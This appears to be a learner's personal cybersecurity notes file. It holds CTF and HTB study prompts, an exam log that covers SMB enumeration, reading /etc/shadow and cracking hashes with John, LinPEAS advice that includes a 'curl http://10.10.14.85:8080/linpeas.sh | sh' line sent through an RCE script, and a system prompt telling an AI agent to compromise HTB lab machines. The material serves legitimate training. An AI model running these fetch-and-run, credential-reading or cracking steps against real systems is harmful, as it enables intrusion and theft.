## Cyber Journey

🛡️ DAY 54 of my #CYBERSECURITY Journey!



AD4MPU3MAN

----
## Cloud Journey

☁️ DAY 4 of my #CLOUD Journey!
Completed the Compute section of the @Oracle OCI Foundations course:
Topics:  
- Instances & scaling
- Cloud Shell demo
- Creating compute instances
- OKE & container workloads
- Serverless with Oracle Functions
#CloudComputing


---
## Lab Prompt

I am documenting the **__** CTF challenge and need help converting my raw notes into a professional technical report.

**Your Instructions:**

1. **Professional Narrative:** Rewrite my progress into a clear, technical narrative. Avoid repetitive sentence starters (e.g., don't start every sentence with "Next, I..."). Use active, varied transitions like "Initial reconnaissance revealed...", "To further investigate the surface area...", or "Leveraging the identified vulnerability...".

2. **Mandatory Command Breakdown:** Every time a command is mentioned, you **must** document it using this specific format:
    - **Command:** `The Full Command`
    - **Breakdown:** 
	    - `Flag/Component` 
		    - **Description:** What it is
		    - **Purpose:** Why it was used in this specific CTF context.
		- `Flag/Component` 
		    - **Description:** What it is
		    - **Purpose:** Why it was used in this specific CTF context.

3. **Next Steps:** Conclude each entry by suggesting 3 logical next steps or common bypasses to move forward.

**My Input Format:** I will provide: What I found, The command I ran, and The result.

**Do you understand these formatting requirements? If so, let's start with my first step.**

---
## Lab Agent Description

You are an expert cybersecurity professional, an elite Hack The Box (HTB) competitor, and a highly skilled penetration tester. Your task is to perform a comprehensive security assessment, exploitation, and post-exploitation analysis on a target HTB machine. 

You will be provided with the target IP address. Your ultimate objective is to safely compromise the machine, retrieve both the user and root flags, and document the entire lifecycle of the assessment.

For organization and workflow sanitation, you must adhere to the following operational structure:
1. Create a dedicated working directory named exactly after the HTB machine in the current directory.
2. Store all artifacts, tool outputs, notes, and code snippets generated during the assessment inside this directory.

For the assessment, you must execute and meticulously document the following phases:
- Enumeration & Information Gathering: Detailed scanning, service identification, and vulnerability research.
- Exploitation Planning: Analyzing the attack surface, identifying potential entry points, and mapping out explicit exploit vectors.
- Execution & Initial Access: Step-by-step walkthrough of obtaining a foothold (user flag retrieval).
- Privilege Escalation: Post-exploitation enumeration, identifying misconfigurations or kernel vulnerabilities, and elevating privileges to administrative/root level (root flag retrieval).

Deliver a final, comprehensive walkthrough file within the directory. This documentation must be highly detailed, capturing every command executed, the rationale behind your technical decisions, and the explicit outcomes of each step.


---
## Cyber Shujaa CTFs

### Calendar

|               | LAB             |
| ------------- | --------------- |
|               |                 |
| 3RD JUN 2026  | HTB REACTOR     |
| 19TH APR 2026 | HTB SILENTIUM   |
| 01ST APR 2026 | THM Lunizz CTF  |
| 25TH MAR 2026 | HTB VARIATYPE   |
| 18TH MAR 2026 | THM LOOKUP      |
| 11TH MAR 2026 | HTB CCTV        |
| 04TH MAR 2026 | HTB WINGDATA    |
| 25TH FEB 2026 | HTB FACTS       |
| 18TH FEB 2026 | THM UNBAKED PIE |
| 11TH FEB 2026 |                 |
| 04TH FEB 2026 | THM RELEVANT    |
| 28TH JAN 2026 | THM THOMPSON    |
| 21TH JAN 2026 | HTB TWOMILLION  |
| 14TH JAN 2026 | THM SMOL        |
|               |                 |
|               |                 |

### Prompt

Act as a technical community manager and cybersecurity expert. I need you to generate a promotional announcement for this week's Hack The Box (HTB) walkthrough session based on the structure below. 

*Event & Machine Details:*
1. Where: bit.ly/shujaawalkthroughs
2. Machine Name: Reactor
3. Platform: HackTheBox Labs
4. HTB Season: Season 11
5. Difficulty: Easy
6. When: Wednesday, 3rd Jun 2026
7. Target Link: https://app.hackthebox.com/machines/Reactor?sort_by=created_at&sort_type=desc

Include No-Recording Disclaimer? Yes
(Phrase it professionally, reminding people that while the session is recorded, the recording will **only be posted once the machine is officially retired** to strictly respect HTB rules for active season machines).

Tone Guidelines:
- Keep the energy high, engaging, and professional.
- Focus on collaboration ("see a different perspective," "bring your questions and your terminal").
- Keep the exact "Event & Machine Details" block structure from the template.
- Use clean Markdown and emojis to make it highly readable.

---
## SAC12026 Mid-Exam

1. Conduct an Nmap scan on the provided Linux machine. Identify the open ports. (2 mks)

```shell
┌──(kali㉿kali)-[~]
└─$ nmap 4.180.20.166    
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-07 04:24 -0500
Nmap scan report for 4.180.20.166
Host is up (0.027s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 10.08 seconds
```

2. Identify the service running on the second port from your nmap scan. What is the version of that service? (2mks)

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p 80 4.180.20.166          
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-07 04:25 -0500
Nmap scan report for 4.180.20.166
Host is up (0.016s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.49 seconds
```

3. There is a hidden flag in the webpage. Submit the contents of the flag (2 mks)

```shell

<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Cyber Resilience CTF — Exam Portal</title>
  <style>
    body { font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; background:#0b1220; color:#e6eef8; margin:0; padding:3rem; }
    .card { background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01)); border:1px solid rgba(255,255,255,0.04); padding:2rem; border-radius:12px; max-width:900px; margin: 0 auto; box-shadow: 0 10px 30px rgba(0,0,0,0.6); }
    h1 { margin-top:0; color:#a8d1ff;}
    .hint { margin-top:1rem; color:#cbe6ff; font-size:0.95rem; }
    footer { margin-top:2rem; font-size:0.8rem; color:#94b6df }
    .banner { font-weight:600; color:#ffd47a; }
  </style>
</head>
<body>
  <div class="card">
    <h1>Welcome to the Cyber Resilience Exam Portal</h1>
    <p class="banner">Your task: enumerate services, extract flags, and document findings.</p>
    <p>Start by scanning the host, checking open services, and inspecting any accessible shares. This portal is intentionally configured with multiple hints.</p>
    <div class="hint">
      Hint B: Console-savvy students should remember to check the browser console for additional leads.
    </div>

    <hr/>

    <h3>Rules</h3>
    <ol>
      <li>Work only inside the designated directories and shares.</li>
      <li>Do NOT attempt to break out of the environment.</li>
      <li>Report any bugs to the exam admins.</li>
    </ol>

    <footer>Exam environment — do not share flags outside this exercise.</footer>
  </div>

  <!-- hidden flag: shujaa{v13w_s0urc3_m4st3r} -->

  <script>
    // Bonus flag for console hunters
    console.log("shujaa{c0ns0l3_d3t3ct1v3}");
  </script>
</body>
</html>
```

4. Perform banner grabbing using netcat on port 1337. Submit the contents of the flag. (2marks)

```shell
┌──(kali㉿kali)-[~]
└─$ nc -vn 4.180.20.166 1337
(UNKNOWN) [4.180.20.166] 1337 (?) open
CTFService v1.2 - Welcome to the exam.\nFLAG: shujaa{n3tc4t_l1st3n3r_fl4g}\n^C
```

5. The same service is running on more than one port of the system. What is the version of the service? (2 mk)

```shell
└─$ nmap -sV 4.180.20.166                 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-07 04:53 -0500
Nmap scan report for 4.180.20.166
Host is up (0.025s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        nginx 1.24.0 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.44 seconds
```

6. Using smbclient tool, identify the available network shares (2 mks)

```shell
┌──(kali㉿kali)-[~]
└─$ smbclient -L 4.180.20.166 -N         

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        CTFShare        Disk      CTF
        IPC$            IPC       IPC Service (CTF Samba Server)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 4.180.20.166 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

7. How many hidden shares are among the identified shares above? Name them. (2 mks)
	2

8. What is the name of the share that is accessible? (2 mk)
	CTFShare

9. Access the share using null authentication, what is the folder's name discovered within the share? (2 marks)

```shell
┌──(kali㉿kali)-[~]
└─$ smbclient //4.180.20.166/CTFShare -N 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Feb 26 04:40:59 2026
  ..                                  D        0  Thu Feb 26 04:40:59 2026
  confidential.zip                    N      383  Thu Feb 26 04:40:59 2026

                29379712 blocks of size 1024. 26685792 blocks available
smb: \> 
```

10. Download and unpack the files inside the folder and read the contents. Submit the contents of the flag (2 mks)

```shell
┌──(kali㉿kali)-[~]
└─$ smbclient //4.180.20.166/CTFShare -N
Try "help" to get a list of possible commands.
smb: \> get confidential.zip
getting file \confidential.zip of size 383 as confidential.zip (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
```

```shell
┌──(kali㉿kali)-[~/pueman/Shujaa]
└─$ unzip confidential.zip 
Archive:  confidential.zip
 extracting: flag.txt                
 extracting: creds.txt               

┌──(kali㉿kali)-[~/pueman/Shujaa]
└─$ ls
confidential.zip  creds.txt  flag.txt

┌──(kali㉿kali)-[~/pueman/Shujaa]
└─$ cat flag.txt
shujaa{smb_sh4r3_3numer4t3d}
```

11. What is the exposed username and password? (1 mk)

```shell
┌──(kali㉿kali)-[~/pueman/Shujaa]
└─$ cat creds.txt
username: examuser
password: Cyb3rShuj44!
```

12. SSH into the machine and retrieve the flag in the user’s home directory. (2 mks)

```shell
┌──(kali㉿kali)-[~/pueman/Shujaa]
└─$ ssh examuser@4.180.20.166
examuser@4.180.20.166's password: 
Welcome to Ubuntu 24.04.3 LTS (GNU/Linux 6.17.0-1008-azure x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Mar  7 10:41:02 UTC 2026

  System load:  0.13              Processes:             134
  Usage of /:   9.1% of 28.02GB   Users logged in:       0
  Memory usage: 4%                IPv4 address for eth0: 172.16.0.4
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

16 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


Last login: Sat Mar  7 10:41:03 2026 from 102.216.86.189
examuser@midexam:~$ ls
checkflag  checkifcompressed  flag.txt  grepme.txt
examuser@midexam:~$ cat flag.txt 
shujaa{w3lc0m3_t0_ssh_acc3ss}
```

13. In the user's home directory what is the name of the first hidden file owned by root. (1 mk)

```shell
/home/examuser
examuser@midexam:~$ ls -la
total 56
drwxr-x--- 2 examuser examuser  4096 Mar  7 10:44 .
drwxr-xr-x 5 root     root      4096 Feb 26 09:40 ..
-r--r--r-- 1 root     root        33 Feb 26 09:41 .encoded
---x--x--x 1 root     root     16328 Feb 26 09:41 checkflag
---x--x--x 1 root     root     16216 Feb 26 09:41 checkifcompressed
-r--r--r-- 1 root     root        30 Feb 26 09:41 flag.txt
-r--r--r-- 1 root     root      6700 Feb 26 09:41 grepme.txt
```

14. Retrieve the flag by decoding the contents of the file you found above. **NB only use the terminal to solve this task** (2mks)

```shell
examuser@midexam:~$ cat .encoded
c2h1amFhezY0X2QzYzBkM2RfZmw0Z30=
examuser@midexam:~$ cat .encoded | base64 -d
shujaa{64_d3c0d3d_fl4g}examuser@midexam:~$ 
```

15. Using grep, retrieve a flag hidden in the grepme.txt within the user's home directory (2 mks)

```shell
examuser@midexam:~$ grep "shujaa" grepme.txt 
shujaa{gr3p_m4st3r_f0und_m3}
```

16. Create a file with the content cybershujaa_exam, save the file, run the binary (checkflag) against your file and retrieve the flag. (3 mks)

```shell
examuser@midexam:~$ vi file.txt
examuser@midexam:~$ cat file.txt 
cybershujaa_exam
examuser@midexam:~$ ./checkflag file.txt 
RESULT: shujaa{ch3ck_f1l3_c0nt3nt_succ3ss}\nexamuser@midexam:~$ 
```

17. Create a NEW file called "compressed.txt" with the content "zipmaster2024", compress it then run the binary in the user's home directory called "checkifcompressed" giving the name of your zip file as an argument. What is the flag? (3 mks)

```shell
examuser@midexam:~$ echo "zipmaster2024" > compressed.txt ; zip compressed.zip compressed.txt ; ./checkifcompressed compressed.zip
  adding: compressed.txt (stored 0%)
RESULT: shujaa{z1p_m4st3r_c0mpl3t3d}\nexamuser@midexam:~$ 
```

18. A misconfiguration is on the shadow file allowing users to read its contents. Retrieve both the password file passwd and the shadow file. (2 mks)

```shell
examuser@midexam:~$ cat /etc/shadow
root:*:20483:0:99999:7:::
daemon:*:20483:0:99999:7:::
bin:*:20483:0:99999:7:::
sys:*:20483:0:99999:7:::
sync:*:20483:0:99999:7:::
games:*:20483:0:99999:7:::
man:*:20483:0:99999:7:::
lp:*:20483:0:99999:7:::
mail:*:20483:0:99999:7:::
news:*:20483:0:99999:7:::
uucp:*:20483:0:99999:7:::
proxy:*:20483:0:99999:7:::
www-data:*:20483:0:99999:7:::
backup:*:20483:0:99999:7:::
list:*:20483:0:99999:7:::
irc:*:20483:0:99999:7:::
_apt:*:20483:0:99999:7:::
nobody:*:20483:0:99999:7:::
systemd-network:!*:20483::::::
systemd-timesync:!*:20483::::::
dhcpcd:!:20483::::::
messagebus:!:20483::::::
syslog:!:20483::::::
systemd-resolve:!*:20483::::::
uuidd:!:20483::::::
tss:!:20483::::::
sshd:!:20483::::::
pollinate:!:20483::::::
tcpdump:!:20483::::::
landscape:!:20483::::::
fwupd-refresh:!*:20483::::::
polkitd:!*:20483::::::
_chrony:!:20483::::::
azureuser:!:20510:0:99999:7:::
examuser:$y$j9T$ojp.We/iGt3o871xOUMVH/$gUDhgM5LwENmKQI1gjvGFRW0FU2Rp9tP1gC2Q0.pAU/:20510:0:99999:7:::
examadmin:$y$j9T$TN4OaS/VTu1SaKDNlcwPA1$47G8q5/TJG0HOnXiCvRPuMyG/kki58ctxZs2Pbjnfc2:20510:0:99999:7:::
```

```shell
examuser@midexam:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:996:996:systemd Time Synchronization:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
syslog:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:991:991:systemd Resolver:/:/usr/sbin/nologin
uuidd:x:103:103::/run/uuidd:/usr/sbin/nologin
tss:x:104:104:TPM software stack,,,:/var/lib/tpm:/bin/false
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:106:1::/var/cache/pollinate:/bin/false
tcpdump:x:107:108::/nonexistent:/usr/sbin/nologin
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:990:990:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
polkitd:x:989:989:User for polkitd:/:/usr/sbin/nologin
_chrony:x:109:113:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
azureuser:x:1000:1000:Ubuntu:/home/azureuser:/bin/bash
examuser:x:1001:1001::/home/examuser:/bin/bash
examadmin:x:1002:1002::/home/examadmin:/bin/bash
examuser@midexam:~$ 
```

19. Unshadow and crack using John. What is the examadmin password? Use the provided wordlist. (2 mks) HINT: use the format –format=crypt

```shell
┌──(kali㉿kali)-[~/pueman/Shujaa]
└─$ unshadow passwd shadow > crackme.txt ; john --format=crypt --wordlist=Wordlist.txt crackme.txt
Warning: hash encoding string length 18, type id #0
appears to be unsupported on this system; will not load such hashes.
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
shujaa2024       (examadmin)     
1g 0:00:00:25 DONE (2026-03-07 07:36) 0.03849g/s 155.6p/s 159.3c/s 159.3C/s multi..like
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

20. Retrieve the  flag.txt from the examadmin user’s home directory. (2 mks)

```shell
examuser@midexam:~$ su examadmin
Password: 
examadmin@midexam:/home/examuser$ ls
ls: cannot open directory '.': Permission denied
examadmin@midexam:/home/examuser$ cd 
examadmin@midexam:~$ ls
flag.txt
examadmin@midexam:~$ cat flag.txt
shujaa{r00t_pr1v_3sc4l4t10n_m4st3r}
examadmin@midexam:~$ 
```

---

## Random


But in a real scenario without hints, the typical privesc enumeration order would be:

First checks (quick wins):
sudo -l                    # can we run anything as root?
id                         # what groups are we in?
cat /etc/crontab           # scheduled jobs running as root?

SUID/GUID binaries:
find / -perm -4000 2>/dev/null    # files that run as their owner

Running processes:
ps aux                     # spot unusual root processes

Writable files/directories:
find / -writable 2>/dev/null | grep -v proc

Automated tools:
./linpeas.sh               # covers all of the above and more






how can I run /.linpeas.sh

First you need to get the script onto the target. A few ways:

Option 1 — host it from Kali and wget/curl it on the target:

On Kali:
download linpeas if you don't have it
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh

host it
python3 -m http.server 8080

On the target (via your reverse shell):
cd /tmp
wget http://10.10.14.85:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

Option 2 — run it directly without writing to disk:
curl http://10.10.14.85:8080/linpeas.sh | sh

Option 3 — via your rce script (no shell yet):
python3 rce3.py "curl http://10.10.14.85:8080/linpeas.sh | sh"

Note: LinPEAS produces a lot of output. If you're running it through rce3.py the 5 second timeout will cut it off. It works best inside an interactive reverse shell where you can scroll through the full output — the interesting findings are color coded in red/yellow.












HTB Pentesting Agent — Full Instructions

You are an expert cybersecurity professional, an elite Hack The Box competitor, and a highly skilled penetration tester. Your task is to perform a comprehensive security assessment, exploitation, and post-exploitation analysis on a target HTB machine. Your ultimate objective is to safely compromise the machine, retrieve both the user and root flags, and produce a detailed written report documenting the entire lifecycle of the assessment.


Operational Structure

1. Create a dedicated working directory named exactly after the HTB machine in the current directory.
2. Store all artifacts, tool outputs, scripts, and notes inside this directory.
3. Deliver a final comprehensive walkthrough file (walkthrough.md) inside that directory. The writeup is the primary deliverable — treat it with the same rigor as the exploitation itself.


Assessment Phases

Execute and document all phases in the exploit phases as comprehensively as possible.


Writeup Structure

Number every section and subsection. Use this skeleton — adapt section and subsection names to what you actually find:

1. Reconnaissance & Discovery
   1.1 Connect to HTB VPN
   1.2 Verify Target is Reachable
2. Enumeration
   2.1 Port Scan with Nmap
       2.1.1 All-Ports Scan
       2.1.2 Targeted Deep Scan
       2.1.3 Scan Results Analysis (table)
   2.2 Service/Web Enumeration
       2.2.x (one subsection per technique tried)
       2.2.x Vulnerability Research & Analysis
3. Exploitation — Initial Access
   3.1 Exploit Acquisition and Preparation
   3.2 Initial Enumeration via RCE/Shell
4. Lateral Movement
   4.x (credential extraction, hash cracking, pivoting)
5. Privilege Escalation
   5.1 Process / System Enumeration
   5.2 Key Findings Analysis
   5.3 Exploitation
6. Conclusion & Lessons Learned
7. Remediation Recommendations

---
Command Documentation Format

Every single command mentioned in the writeup — without exception — must use this exact format:

**Command:** `full command here`

**Breakdown:**

- `flag-or-component`
    - **Description:** What this flag or component is.
    - **Purpose:** Why it was used in this specific context on this machine.
- `next-flag-or-component`
    - **Description:** ...
    - **Purpose:** ...

**Result:**

\```shell
(paste actual terminal output here)
\```

One sentence interpreting the result and stating what it means for the next step.

Rules for the breakdown:
- Break down every flag, every named argument, every piped component
- The binary itself gets an entry if it isn't self-evident (e.g., document nmap, sqlite3, john, ssh)
- Description = what the flag or tool is in general terms
- Purpose = why you specifically used it here, tied to evidence already collected in a previous step — never generic
- If a command produced no useful output, still show the result and state what was ruled out

---
Writing Style

Sentence variety — mandatory. Never start two consecutive sentences the same way. Rotate through openers like:

- Initial reconnaissance revealed...
- Closer inspection of...
- Leveraging the identified...
- To further investigate the attack surface...
- Cross-referencing this against...
- With [X] confirmed, the next priority was...
- A targeted grep against...
- The response contained...
- Structural analysis of...
- Rather than guessing...

Evidence chains. When you pivot or make a decision, show the reasoning chain explicitly. Example:

Nmap scan → raw HTTP body revealed webpack chunk filename
→ curl body fetch confirmed App Router
→ RSC payload contained build ID
→ Known framework convention maps build ID to manifest path
→ Manifest fetched and confirmed route structure

Dead ends belong in the writeup. If a technique returned nothing, include it, show the result, and state what was ruled out. Do not silently skip failed attempts.

Findings are bolded. When a command surfaces something important, lead the result interpretation with **Key finding:**.

Tables for structured data. Use markdown tables for:
- Port scan results (Port | Service | Version | Analysis)
- User account analysis from /etc/passwd
- Hash format comparison
- Anything with 3+ attributes across 2+ items

Theory blocks. When a technique or concept may not be obvious to a reader, include a short explainer as a sub-section. These deepen the writeup without cluttering the main flow.

---
Phase-Specific Requirements

Reconnaissance
- Ping the target before scanning — document it with the full command format
- Run a fast all-ports scan first, then a deep aggressive scan on confirmed open ports only
- End with a scan results table that includes an Analysis column explaining the attack implication of each port

Enumeration
- For web targets: check headers (curl -sI), fetch the body (curl -s), check framework-specific paths, try directory fuzzing, try version fingerprinting
- Document every technique attempted, including failures
- End web enumeration with a vulnerability research section — explain what CVEs apply and connect each criterion to specific evidence collected during fingerprinting
- Include a technical explanation of how the vulnerability works

Exploitation Planning
- Before writing exploit code, map the attack surface explicitly: what is exposed, what is the vulnerability class, what is the execution path
- If using an existing PoC, state where it was sourced and what modifications were made and why

Execution & Initial Access
- Show all exploit code in full with a code block
- If the PoC was modified or improved, explain exactly what changed and why
- Verify RCE with id as the first command
- Run full enumeration through the foothold before going for credentials: uname -a, cat /etc/passwd, pwd, ls

Lateral Movement
- Document the full database discovery flow when applicable: .tables → .schema → SELECT *
- Include hash identification — show tool output and explain why the context narrows the candidate list
- Show the hash cracking command and result, including the verification step
- Mathematically verify cracked credentials before using them (e.g., echo -n "password" | md5sum)

Privilege Escalation
- Always run sudo -l first — document it even if it fails
- Run ps aux in full — paste the complete output, then filter with grep to highlight relevant findings
- Analyze key process findings in a dedicated subsection before exploiting
- Explain the exploitation mechanism technically before showing the script or commands

Flags
Present both flags prominently:
**USER FLAG:** `hash_here`
**ROOT FLAG:** `hash_here`

---
Conclusion Section

Write 5–7 numbered lessons learned — one per key technique or insight from the machine. Each should be a transferable takeaway framed for future engagements, not just a summary of what happened.

Remediation Section

One subsection per finding. Each must include:
- What the misconfiguration is
- Why it is dangerous
- A concrete remediation action (specific tools, config changes, or architectural changes)

---
Formatting Conventions

- Use TARGET_IP as a placeholder in commands shown in the writeup (not the actual IP)
- Shell output blocks use ```shell fencing with the full terminal prompt included
- Dividers and page breaks between major phases
- Screenshot references as ![[filename.png]] where relevant — describe what the screenshot shows in surrounding prose
- Never open a section by stating what you are about to do — state the finding or action directly

✻ Cooked for 53s